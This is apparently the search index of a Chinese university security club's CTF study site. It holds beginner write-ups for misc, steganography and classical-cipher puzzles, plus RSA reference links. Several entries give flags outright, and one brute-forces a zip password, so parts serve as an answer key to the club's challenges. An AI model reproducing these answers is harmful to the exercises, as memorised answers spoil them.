{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u5b66\u4e60\u7b14\u8bb0","text":"<p> \u7ea6 349 \u4e2a\u5b57  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Tip</p> <p>\u672c\u9879\u76ee\u8ba1\u5212\u91cd\u6784, \u6709\u6765\u586b\u5751\u7684\u5417</p> <p>\u76ee\u524d\u5171\u6709 45 \u4e2a\u9875\u9762\uff0c33726 \u4e2a\u5b57\uff0c3957 \u884c\u4ee3\u7801\uff0c126 \u5f20\u56fe\u7247</p> <p>Note</p> <p>\u8fd9\u5f20\u56fe\u653e\u5728\u524d\u9762\uff0c\u57fa\u7840\u771f\u7684\u5f88\u91cd\u8981\uff0c\u4e0d\u8981\u60f3\u4e00\u6b65\u767b\u5929 </p> <p>\u770b\u9875\u9762\u7684\u4e0a\u90e8\uff0c\u6709\u51e0\u4e2a\u6761\u76ee\u7684\u5bfc\u822a</p> <p>\u53ef\u4ee5\u70b9\u5f00\u7684</p> <p></p>"},{"location":"#misc","title":"MISC","text":"<ul> <li>\u5728\u5404\u4e2a\u65b9\u5411\u7684\u5b66\u4e60\u5c0f\u6709\u6210\u529f\u4e4b\u524d\uff0cmisc\u7684\u5360\u5206\u8fd8\u662f\u5360\u5927\u5934\u7684\uff0c\u4e0a\u6b21\u6821\u8d5b\u5c31\u80fd\u770b\u51fa\u6765</li> <li>\u5b66\u4e60\u6210\u679c\u53ef\u4ee5\u5199\u5728\u5468\u62a5\u91cc\uff0c\u6bd4\u5982\u505a\u4e86\u4ec0\u4e48\u9898</li> <li>\u8981\u5b66Python</li> <li>\u8865\u5145ing...</li> </ul> <p>\u70b9\u6211\u8df3\u8f6c\u5230Misc</p>"},{"location":"#python","title":"python\u5b66\u4e60","text":"<p>\u5927\u5b66\u56db\u5e74\uff0c\u603b\u5f97\u638c\u63e1\u4e00\u95e8\u7528\u7684\u987a\u624b\u7684\u8bed\u8a00</p> <p>python\u5bf9\u7f51\u5b89\uff0c\u5bf9CTF\u8fd8\u662f\u86ee\u5408\u9002\u7684</p> <p>https://www.bilibili.com/video/BV1hf4y1u7CH</p> <p>\u8fd9\u8fb9\u63a8\u8350\u4e00\u4e2a\u975e\u5e38\u57fa\u7840\uff0c\u7b80\u5355\u6613\u61c2\u7684\u5165\u95e8\u6559\u7a0b</p> <p>\u8bb2\u7684\u4e0d\u6df1\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u8ba9\u4f60\u5165\u95e8</p> <p>\u70b9\u6211\u8df3\u8f6c\u5230Python</p>"},{"location":"#_2","title":"\u73b0\u4ee3\u5bc6\u7801\u5b66","text":"<p>\u4e0b\u6b21\u6821\u8d5b\u8fd8\u4f1a\u51fa\u8fd9\u79cd\u5bc6\u7801\u9898\uff0c\u56e0\u4e3a\u5e0c\u671b\u6709\u4eba\u5b66</p> <p>\u60f3\u5b66\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\u7814\u7a76\uff0c\u53bb\u7f51\u4e0a\u641c\u5404\u79cd\u8d44\u6599\uff0c\u6559\u4e0d\u4e86\uff0c\u56e0\u4e3a\u771f\u4e0d\u4f1a</p> <p>\u6211\u5728\u8fd9\u8fb9\u653e\u4e86\u4e00\u4e9b\u8d44\u6599\u7ed9\u5927\u5bb6\uff0c\u53ef\u4ee5\u81ea\u884c\u5b66\u4e60</p> <p>\u70b9\u6211\u53bb\u770bRSA\u57fa\u7840\u9898\u578b</p>"},{"location":"#web","title":"Web\u65b9\u5411","text":"<p>\u5165\u95e8\u6700\u5feb\u7684\u65b9\u5411\uff0c\u540c\u65f6\u53c8\u662f\u6700\u6742\u7684\u65b9\u5411\uff0c\u51b3\u5b9a\u4e86\u4ed6\u7684\u7528\u9014\u5f88\u5e7f\u6cdb</p> <p>\u5efa\u8bae\u662f\u90fd\u8981\u5bf9owasp top 10\u6f0f\u6d1e\u6709\u4e00\u5b9a\u7684\u4e86\u89e3</p> <p>\u8df3\u8f6cWeb</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/","title":"MISC","text":"<p> \u7ea6 1743 \u4e2a\u5b57  4 \u884c\u4ee3\u7801  54 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_1","title":"\u7b7e\u5230","text":"<p>\u5173\u6ce8\u9f50\u9c81\u5e08\u9662\u7f51\u7edc\u5b89\u5168\u793e\u56e2\u516c\u4f17\u53f7\uff0c\u53d1\u9001QLNUCTF\uff0c\u5373\u53ef\u5f97\u5230\u672c\u9898flag</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#base","title":"base\u7f16\u7801","text":"<p>\u8003\u70b9\uff1abase64\u7f16\u7801</p> <p>\u767e\u5ea6\u641c\u7d22base\u7f16\u7801</p> <p>https://the-x.cn/base64/</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_2","title":"\u4f60\u731c\u5b83\u5c5e\u5565","text":"<p>\u8003\u70b9\uff1a\u67e5\u770b\u6587\u4ef6\u5c5e\u6027</p> <p>\u4e0b\u8f7d\u540e\u53f3\u952e\u627e\u5230\u5c5e\u6027</p> <p>\u5f80\u4e0b\u7ffb</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#010","title":"010\u7684\u5965\u79d8","text":"<p>\u8003\u70b9\uff1a010editor\u7684\u4f7f\u7528</p> <p>010 editer\u4e0b\u8f7d\u94fe\u63a5 https://file.shenghuo2.top/file/010%20Editor.rar</p> <p>\u7528010\u67e5\u770b\u6587\u4ef6\u6700\u540e</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_3","title":"\u4f1a\u52a8\u7684\u56fe","text":"<p>\u8003\u70b9\uff1aGIF\u56fe\u7247\u7684\u9010\u5e27\u67e5\u770b</p> <p>\u4f7f\u7528stegslove\u6253\u5f00\u56fe\u7247</p> <p></p> <p>\u518d\u4f7f\u7528frame browser\u67e5\u770b\uff0c\u6216\u8005\u641c\u7d22\u5728\u7ebfgif\u67e5\u770b\u5668</p> <p>\u53cd\u6b63\u53ea\u8981\u9010\u5e27\u67e5\u770b\u56fe\u7247\u5c31\u53ef\u4ee5</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_4","title":"\u8868\u767d\u7684\u8bdd","text":"<p>\u8003\u70b9:md5\u503c\u53cd\u5411\u67e5\u8be2</p> <p>md5\u89e3\u5bc6\u7f51\u5740\uff1ahttps://www.somd5.com/</p> <p>md5(\u8868\u767d\u7684\u8bdd)=3e451fbcff5fef443993a72c66713e29</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_5","title":"\u793e\u4f1a\u4e3b\u4e49\u597d\u9752\u5e74","text":"<p>\u8003\u70b9\uff1a\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801</p> <p>\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801</p> <p>http://www.hiencode.com/cvencode.html</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_6","title":"\u60f3\u89c1\u51fa\u9898\u4eba\u5417\uff1f","text":"<p>\u8003\u70b9\uff1a\u4e8c\u7ef4\u7801\u4fee\u590d</p> <p>\u4e00\u4e2a\u88ab\u4ece\u4e2d\u95f4\u5206\u5f00\u7684\u4e8c\u7ef4\u7801</p> <p>\u622a\u56fe  \u7136\u540e\u7528PPT\u62fc\u63a5\u5c31\u53ef\u4ee5</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_7","title":"\u597d\u957f\u7684\u6587\u672c","text":"<p>\u8003\u70b9\uff1abase64\u7f16\u7801\u8f6c\u56fe\u7247</p> <p>\u5728\u7ebfBase64\u7f16\u7801\u8f6c\u56fe\u7247</p> <p>http://www.atoolbox.net/Tool.php?Id=1024</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u8fd9\u6837\u67e5\u770b</p> <p>\u6d4f\u89c8\u5668\u5730\u5740\u680f\u8f93\u5165data:image/jpg;base64,\u8981\u89e3\u7801\u7684\u503c</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_8","title":"\u4f60\u770b\u5230\u6211\u7684\u73ab\u7470\u4e86\u5417","text":"<p>\u8003\u70b9\uff1aurl\u7f16\u7801\uff0cw\u5f62\u6805\u680f\u5bc6\u7801</p> <p>\u5148\u8fdb\u884curl\u89e3\u7801</p> <p>http://www.hiencode.com/url.html</p> <p></p> <p>\u8fd9\u9053\u9898\u662fW\u5f62\u6805\u680f\u5bc6\u7801</p> <p>http://moersima.00cha.net/shanlan.asp</p> <p>\u4e0d\u77e5\u9053\u5206\u680f\u6570\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7f51\u7ad9\u7206\u7834</p> <p></p> <p>\u7136\u540e\u628aflag{}\u6539\u6210QLNU{}\u63d0\u4ea4\u5373\u53ef</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#bang","title":"bang","text":"<p>\u8003\u70b9\uff1a\u538b\u7f29\u5305\u5bc6\u7801\u7206\u7834</p> <p>\u4e0b\u8f7d\u4e4b\u540e\u662f\u538b\u7f29\u5305\uff0c\u6253\u5f00\u9700\u8981\u5bc6\u7801</p> <p></p> <p>\u53ef\u770b\u5230\u9898\u76ee\u63cf\u8ff0\u8bf4\u5bc6\u7801\u4e3a\u56db\u4f4d\u6570</p> <p></p> <p>\u70b9\u51fb\u4e0b\u8f7dARCHPR</p> <p>\u8f6f\u4ef6\u7206\u7834\u5f97\u5230\u5bc6\u7801</p> <p></p> <p>\u89e3\u538b\u5f97\u5230flag</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#base_1","title":"base\u5bb6\u65cf","text":"<p>\u8003\u70b9\uff1a\u5404\u79cdbase\u7f16\u7801</p> <p>\u8003base\u7684\u5404\u79cd\u7f16\u7801</p> <p>https://ctf.bugku.com/tools</p> <p>\u53ef\u4ee5\u7528\u8fd9\u91cc\u7684base\u5bb6\u65cf</p> <p>\u89e3\u7801\u987a\u5e8f\uff0cbase64--&gt;base85--&gt;base32--&gt;base64</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_9","title":"\u5047\u5bc6\u7801","text":"<p>\u8003\u70b9\uff1azip\u4f2a\u52a0\u5bc6 </p> <p>\u4fee\u6539\u5168\u5c40\u52a0\u5bc6</p> <p>\u5747\u6539\u4e3a0</p> <p></p> <p>\u91cd\u65b0\u89e3\u538b</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_10","title":"\u540e\u7f00\u5462\uff1f","text":"<p>\u8003\u70b9\uff1a\u5e38\u89c1\u7c7b\u578b\u6587\u4ef6\u5934\u7684\u8fa8\u8ba4 </p> <p></p> <p></p> <p></p> <p></p> <p>flag1 flag2 flag3 flag4\u5206\u522b\u662fpng jpg bmp zip\u6587\u4ef6</p> <p>\u91cd\u547d\u540d\u4fee\u6539\u540e\u6253\u5f00\u5373\u53ef</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#whoimi","title":"WhoIMI","text":"<p>\u8003\u70b9\uff1a\u4fe1\u606f\u6536\u96c6</p> <p>\u767e\u5ea6\u8bc6\u56fe</p> <p>\u627e\u5230\u7535\u5f71\u76f8\u5173\u7684\u6587\u7ae0</p> <p></p> <p>QLNU{\u4e3b\u89d2\u6240\u5728\u56e2\u961f\u540d\u5b57_\u56e2\u961f\u56db\u4eba\u7684\u5076\u50cf}</p> <p></p> <pre><code>QLNU{CLAY_MRX}\n</code></pre>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_11","title":"\u6e38\u620f","text":"<p>\u538b\u7f29\u5305\u5185bin\u4e3a\u6e38\u620f\u5b58\u6863    \u6253\u5f00\u538b\u7f29\u5305\u6ce8\u91ca\u4e2d\u7684\u7f51\u5740</p> <p>\u53bb\u89c2\u5bdf\u6e38\u620f\u754c\u9762\u90fd\u6709\u4ec0\u4e48  \u53d1\u73b0\u53ef\u4ee5\u5bfc\u5165\u5b58\u6863 \u5de6\u8fb9\u5bfc\u5165\u5b58\u6863 (\u5373\u5c06\u6587\u4ef6\u7ed9\u7684bin\u5bfc\u5165  </p> <p>\u5728\u73a9\u4e00\u73a9\u6e38\u620f\u5728\u6e38\u620f\u6307\u5bfc\u6709 shift\u529f\u80fd \uff08shift+x\uff09\u6328\u4e2a\u5220\u5220\uff08\u53ea\u5269\u4e0b\u8fd0\u8f93\u5668\u5373\u53ef\u770b\u6e05\u7b54\u6848</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#misc-steganography","title":"MISC STEGANOGRAPHY","text":""},{"location":"misc%E7%BB%83%E4%B9%A0wp/#flag","title":"flag\u5728\u54ea\u5462","text":"<p>\u8003\u70b9\uff1adocx\u6587\u4ef6\u9690\u5199</p> <p>\u4e0b\u8f7d\u6587\u4ef6\uff0cdocx\u6587\u4ef6</p> <p></p> <p>ctrl+a\u5168\u9009\u4e00\u4e0b\u6587\u5b57\uff0c\u53d1\u73b0\u7b2c\u4e8c\u884c\u6709\u4e1c\u897f</p> <p></p> <p>\u6539\u4e00\u4e0b\u5b57\u4f53\u989c\u8272</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_12","title":"\u817f\u5462\uff1f","text":"<p>\u8003\u70b9\uff1a\u4fee\u6539\u56fe\u7247\u5bbd\u9ad8</p> <p>\u4e0b\u8f7d\u9898\u76ee\uff0c\u5f97\u5230\u4e00\u5f20\u56fe\u7247</p> <p>\u53d1\u73b0\u4e0d\u80fd\u6b63\u5e38\u663e\u793a    \u901a\u8fc7\u7565\u7f29\u56fe\u53d1\u73b0\u56fe\u7247\u770b\u4e0d\u5230\u817f\uff0c\u731c\u6d4b\u4e3a\u4fee\u6539\u56fe\u7247\u9ad8\u5ea6</p> <p></p> <p>\u6839\u636e\u9898\u76ee\u53ef\u77e5\u8be5\u56fe\u7247\u5e94\u8be5\u6709\u817f\uff0c\u7528010\u6253\u5f00\uff0c\u4fee\u6539\u9ad8\u5ea6</p> <p></p> <p>\u4fee\u6539\u7684\u6570\u5c3d\u91cf\u5927\u70b9\uff0c\u4e0d\u5bb9\u6613\u51fa\u9519</p> <p></p> <p>\u4fee\u6539\u5b8c\u522b\u5fd8\u4e86\u4fdd\u5b58\u54c8\uff01\uff01\uff01\uff08\u5feb\u6377\u952e\uff1actrl+s\uff09\u7136\u540e\u518d\u6b21\u6253\u5f00\u56fe\u7247</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_13","title":"\u4eba\u7f8e\u5fc3\u5584\u7684\u5b66\u59d0","text":"<p>\u8003\u70b9\uff1a\u6587\u4ef6\u540e\u85cf\u7684\u6587\u4ef6\u5206\u79bb</p> <p>ctrl+f \u9009\u62e9\u572816\u8fdb\u5236\u5b57\u8282\u641c\u7d22png\u6587\u4ef6\u7684\u6587\u4ef6\u593489 50 4E</p> <p>\u5404\u7c7b\u6587\u4ef6\u5934\u6587\u4ef6\u5c3e\u603b\u7ed3\uff1a http://t.csdn.cn/A1jnj</p> <p></p> <p>\u53d1\u73b0\u6709\u4e24\u4e2a\uff0c\u53ef\u4ee5\u731c\u6d4b\u8fd9\u4e2a\u56fe\u7247\u91cc\u8fd8\u6709\u4e00\u5f20\u56fe\u7247\uff08\u4e0d\u80fd\u786e\u5b9a\u7684\u8bdd\uff0c\u53ef\u4ee5\u641c\u4e00\u4e0bpng\u7684\u6587\u4ef6\u5c3e\uff0c\u770b\u662f\u4e0d\u662f\u4e24\u4e2a\uff09</p> <p>\u70b9\u51fb\u7b2c\u4e8c\u4e2a\uff0c\u4f1a\u81ea\u52a8\u5b9a\u4f4d\uff0c\u7136\u540e\u4ece\u6b64\u5904\u5f00\u59cb\u5230\u6700\u540e\u590d\u5236\u4e0b\u6765</p> <p></p> <p>\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\uff08\u63a8\u8350\u65b0\u5efa\u5341\u516d\u8fdb\u5236\u6587\u4ef6\uff0c\u56e0\u9898\u800c\u5f02\uff09</p> <p></p> <p>\u5c06\u590d\u5236\u7684\u5185\u5bb9\u7c98\u8d34\u5230\u65b0\u5efa\u7684\u6587\u4ef6\u91cc\uff0c\u4fdd\u5b58\uff08\u5feb\u6377\u952e\uff1actrl+c\u590d\u5236\uff0cctrl+v\u7c98\u8d34,ctrl+s\u4fdd\u5b58\uff09</p> <p></p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#1","title":"\u56fe\u7247\u9690\u51991","text":"<p>\u8003\u70b9\uff1aLSB\u9690\u5199</p> <p>\u4e0b\u8f7d\u51fa\u6765\u4e00\u5f20\u56fe\u7247</p> <p>\u6839\u636e\u56fe\u7247\u540d\u79f0\u8054\u60f3\u5230\u8f6f\u4ef6Stegsolve\uff08\u5177\u4f53\u4f7f\u7528\u65b9\u6cd5\u767e\u5ea6\uff09</p> <p></p> <p></p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u57fa\u7840\u7684\u8003\u6cd5\u662fLSB\u9690\u5199</p> <p></p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#2","title":"\u56fe\u7247\u9690\u51992","text":"<p>\u8003\u70b9\uff1aLSB\u901a\u9053\u9690\u5199</p> <p>\u4e0b\u8f7d\u5f97\u5230\u56fe\u7247\uff0c\u7528Stegsolve\u6253\u5f00</p> <p></p> <p>\u901a\u8fc7\u4e0b\u9762\u4e24\u4e2a\u6309\u94ae\uff0c\u8fdb\u884c\u989c\u8272\u901a\u9053\u53d8\u6362</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_14","title":"\u5c31\u662f\u4e0d\u60f3\u544a\u8bc9\u4f60","text":"<p>\u8003\u70b9\uff1a\u76f2\u6c34\u5370</p> <p>\u9644\u4ef6\u6709\u4e24\u4e2a\u56fe\u9762\uff0c\u6709\u4e00\u4e2ahint.jpg\u5148\u62d6\u5230010\u91cc\u67e5\u770b\u4e00\u4e0b\uff0c\u5728\u6700\u540e\u53d1\u73b0\u4e86base64\u5b57\u7b26\u4e32</p> <p></p> <p>\u89e3\u5bc6\u4e00\u4e0b</p> <p></p> <p>\u63d0\u793a\u5c1d\u8bd5\u4e00\u4e0b\u6c34\u5370\uff0c\u7528\u5de5\u5177WaterMarkH\u6765\u63d0\u53d6</p> <p>\u4e0b\u8f7d\u94fe\u63a5\uff1ahttps://file.shenghuo2.top/file/WaterMarkH.exe</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_15","title":"\u53e4\u5178\u5bc6\u7801","text":""},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_16","title":"\u53e4\u5178\u5bc6\u7801\u5165\u95e8\u6307\u5317","text":"<p>\u5728pdf\u7684\u6700\u540e</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#caesar","title":"\u6211\u7231\u4f60\uff01Caesar","text":"<p>\u8003\u70b9\uff1a\u51ef\u6492\u5bc6\u7801</p> <p>\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u679a\u4e3e</p> <p>https://ctf.bugku.com/tool/caesar</p> <p>\u6ce8\u610f\u6709\u4e9b\u5de5\u5177\u4f1a\u8ba9\u5927\u5c0f\u5199\u6d88\u5931\uff0c\u5bfc\u81f4\u4e0d\u6b63\u786e</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_17","title":"\u542c\u4f5b\u8bf4\u5b87\u5b99\u7684\u771f\u8c1b","text":"<p>\u8003\u70b9\uff1a\u4f5b\u66f0\u89e3\u5bc6</p> <p>https://www.keyfc.net/bbs/tools/tudoucode.aspx</p> <p>\u4f5b\u66f0\uff1a\u5f00\u5934\u4e3a\u4f5b\u66f0\u52a0\u5bc6\u7684\u7279\u5f81</p> <p></p> <p>\u5c06\u8981\u89e3\u5bc6\u5185\u5bb9\u653e\u5728\u4e0b\u9762\uff0c\u7136\u540e\u70b9\u51fb\u53c2\u609f\u4f5b\u6240\u8a00\u7684\u771f\u610f\u5373\u53ef</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_18","title":"\u7ea2\u661f\u95ea\u95ea\u653e\u5149\u8292","text":"<p>\u8003\u70b9\uff1a\u793e\u4f1a\u4e3b\u4e49\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801</p> <p>http://www.hiencode.com/cvencode.html</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#ascii","title":"\u4f60\u77e5\u9053ascii\u7684\u5168\u79f0\u662f\u4ec0\u4e48\u5417","text":"<p>\u8003\u70b9\uff1aASCII\u7801\u8f6c\u6362</p> <p>http://www.hiencode.com/jinzhi.html</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_19","title":"\u4f60\u770b\u6211\u773c\u719f\u5417","text":"<p>\u8003\u70b9\uff1a8\u8fdb\u5236\u7684ASCII\u7801\u8f6c\u6362</p> <p>8\u8fdb\u5236\u7279\u5f81\uff0c\u53ea\u75310-7 8\u4e2a\u6570\u5b57\u7ec4\u6210</p> <p>\u89c2\u770b\u6b64\u9898\u662f\u4e00\u5806\u4ee3\u7801\uff0c\u4f46\u662f\u5f88\u591a\u6570\u8d85\u8fc7\u4e86127\uff0c\u6240\u4ee5\u80af\u5b9a\u4e0d\u662f\u5341\u8fdb\u5236\u7684ascii\uff0c\u518d\u53d1\u73b0\u6570\u5b57\u90fd\u662f0\u52307\uff0c\u6240\u4ee5\u5224\u65ad\u4e3a\u516b\u8fdb\u5236ascll\u7801</p> <p>\u5148\u8f6c\u6362\u4e3a\u5341\u8fdb\u5236</p> <p>81 76 78 85 123 69 118 51 95 115 51 101 110 95 97 78 95 111 99 116 97 108 125</p> <p>\u518d\u8fdb\u884c\u8f6c\u6362\u6210ascii\u7801</p> <p></p> <p>\u53ef\u4ee5\u7528python\u5199\u4e00\u4e2a\u8fdb\u5236\u8f6c\u6362\u7684\u811a\u672c</p> <pre><code>a = \"121 114 116 125 173 105 166 63 162 137 163 63 145 156 137 141 116 137 157 143 164 141 154 175\"\n\nfor i in a.split(' '):\n    print(chr(int(i,8)),end='')\n</code></pre>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#701","title":"7\u30010\u548c1\u7b2c\u4e00\u9898","text":"<p>\u8003\u70b9\uff1a\u6469\u65af\u7f16\u7801</p> <p>\u89c2\u5bdf\u6b64\u9898\uff0c\u53d1\u73b0\u53ea\u67090\u548c1\u7ec4\u6210\u7684\u7f16\u7801\uff0c\u5224\u65ad\u6b64\u7f16\u7801\u6709\u4e24\u79cd\u5f62\u5f0f\u8f93\u51fa\uff0c\u56e0\u6b64\u6682\u65f6\u5224\u65ad\u4e3a\u6469\u65af\u7535\u7801</p> <p>\u6469\u65af\u7535\u7801\u7531-\u548c.\u7ec4\u6210\uff0c\u6240\u4ee5\u628a0\u548c1\u6362\u6210-\u548c.</p> <p>https://www.tooleyes.com/app/morse.html\u5728\u7ebf\u89e3\u7801\u7f51\u7ad9</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#01","title":"0\u548c1\u7b2c\u4e8c\u9898","text":"<p>\u8003\u70b9\uff1a\u57f9\u6839\u5bc6\u7801</p> <p>\u6253\u5f00\u6b64\u9898\uff0c\u53d1\u73b0\u8fd8\u662f\u75310\u548c1\u7ec4\u6210\u7684\u7f16\u7801\uff0c\u7ecf\u8fc7\u6469\u65af\u7535\u7801\u5c1d\u8bd5\uff0c\u53d1\u73b0\u9519\u8bef\uff0c\u5728\u641c\u7d22\u53d1\u73b0\u662f\u57f9\u6839\u5bc6\u7801\u4e5f\u662f\u7531\u4e24\u4e2a\u5b57\u7b26\u6784\u6210\uff0c\u4e3aA\u548cB\uff0c</p> <p>\u7136\u540e\u7ecf\u8fc7\u8f6c\u5316\uff0c\u5728\u7f51\u4e0a\u5728\u7ebf\u89e3\u7801\u57f9\u6839\u5bc6\u7801\u5de5\u5177\u53d1\u73b0\u89e3\u4e0d\u51fa\u6765\u5bc6\u7801\uff0c</p> <p>\u518d\u7ecf\u8fc7\u641c\u7d22\u53d1\u73b0\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff0c\u7136\u540e\u4e00\u4e2a\u4e00\u4e2a\u5bf9\u7167\u7b2c\u4e8c\u4e2a\u8868\u683c\u627e\u5c31\u53ef\u4ee5\u4e86</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_20","title":"\u6b6a\u6bd4\u5df4\u535c","text":"<p>\u8003\u70b9\uff1aBubbleBabble</p> <p>http://www.hiencode.com/bubble.html</p> <p>\u7f51\u7ad9\u89e3\u5bc6\u5373\u53ef</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_21","title":"\u5934\u8111\u98ce\u66b4","text":"<p>\u8003\u70b9\uff1abrainfuck</p> <p>http://www.hiencode.com/brain.html</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_22","title":"\u4eba\u7f8e\u5fc3\u5584\u7684\u5b66\u59d0\u53c8\u6765\u4e86","text":"<p>\u8003\u70b9\uff1a\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd</p> <p>\u6839\u636e\u6587\u4ef6\u540d \u94f6\u6cb3\u7684\u82f1\u8bed \u53ef\u4ee5\u8054\u60f3\u5230\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd</p> <p></p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#_23","title":"\u7ef4\u591a\u5229\u4e9a\u7684\u79d8\u5bc6","text":"<p>\u8003\u70b9\uff1a\u672a\u77e5\u5bc6\u94a5\u7684\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801</p> <p>\u53d1\u73b0\u6b64\u9898\u7c7b\u4f3c\u4e8e\u51ef\u6492\u5bc6\u7801\uff0c\u4f46\u662f\u679a\u4e3e\u5e76\u6ca1\u6709\u5f97\u5230\u60f3\u8981\u7684\u7b54\u6848</p> <p>\u6240\u4ee5\u63a8\u65ad\u4e3a\u6ca1\u6709\u79d8\u94a5\u7684\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u7136\u540e\u53bb\u7f51\u4e0a\u641c\u7d22\u89e3\u5bc6\u7f51\u7ad9</p> <p>https://www.guballa.de/vigenere-solver\uff0c\u5728\u7ebf\u7206\u7834\u89e3\u5bc6\uff08\u6ce8\u610f\u8bed\u8a00\u8981\u9009English\u54e6\uff09</p>"},{"location":"misc%E7%BB%83%E4%B9%A0wp/#basebase","title":"\u662fbase\u4f46\u4e0d\u4ec5\u4ec5\u662fbase","text":"<p>\u8003\u70b9\uff1a\u7531base64\u7f16\u7801\u7684\u52a0\u76d0\u52a0\u5bc6</p> <p>Rabbit TripleDES DES AES\u56db\u79cd\u662f\u4ee5U2\u5f00\u5934\uff0c\u5e26\u5bc6\u94a5\u7684\u5bf9\u79f0\u52a0\u5bc6</p> <p>http://www.esjson.com/rabbitEncrypt.html</p> <p></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/","title":"\u7d22\u5f15","text":"<p> \u7ea6 15 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/#rsa","title":"rsa\u57fa\u7840\u8d44\u6599","text":"<p>\u8f6c\u8f7d\u4e8eB\u7ad9up\u98ce\u4e8c\u897f </p> <p>https://space.bilibili.com/317479700/</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P00%20%E5%A4%A7%E7%BA%B2%E5%8F%8A%E5%8F%82%E8%80%83%E7%BD%91%E9%A1%B5/","title":"P00 \u5927\u7eb2\u53ca\u53c2\u8003\u7f51\u9875","text":"<p> \u7ea6 113 \u4e2a\u5b57  68 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u672c\u6587\u8f6c\u8f7d\u4e8eB\u7ad9up\u98ce\u4e8c\u897f  https://space.bilibili.com/317479700/</p> <p>http://www.py3study.com/Article/details/id/19417.html</p> <p>https://bbs.pediy.com/thread-266504.htm</p> <p>https://blog.csdn.net/vhkjhwbs/article/details/101160822</p> <p>https://www.freebuf.com/articles/database/264603.html</p> <p>https://www.dazhuanlan.com/2019/10/04/5d970ff4a37c5/</p> <p>ctf\u5bc6\u7801\u5b66\u5e38\u7528python\u5e93</p> <p>https://www.cnblogs.com/coming1890/p/13506932.html</p> <p>https://blog.csdn.net/chenzzhenguo/article/details/94339659</p> <p>http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</p> <p>\u6b27\u62c9\u51fd\u6570\u03c6(n)\u7684\u5b9a\u4e49\u662f\u5c0f\u4e8en\u7684\u81ea\u7136\u6570\u4e2d\u4e0en\u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570. \u90a3\u4e48\u5bf9\u4e8ep^e, \u5b83\u53ea\u6709\u8d28\u56e0\u6570p,\u90a3\u4e48\u4e0d\u4e0e\u5b83\u4e92\u8d28\u7684\u6570\u80af\u5b9a\u542b\u6709p\u8fd9\u4e2a\u8d28\u56e0\u5b50,\u8fd9\u6837\u7684\u6570\u6709p^e p=p<sup>{e-1}\u4e2a,\u5269\u4e0b\u7684\u4e3a\u4e0ep</sup>e\u4e92\u8d28\u7684,\u6709p<sup>e-p</sup>*(p-1)\u4e2a}=p^{e-1</p> 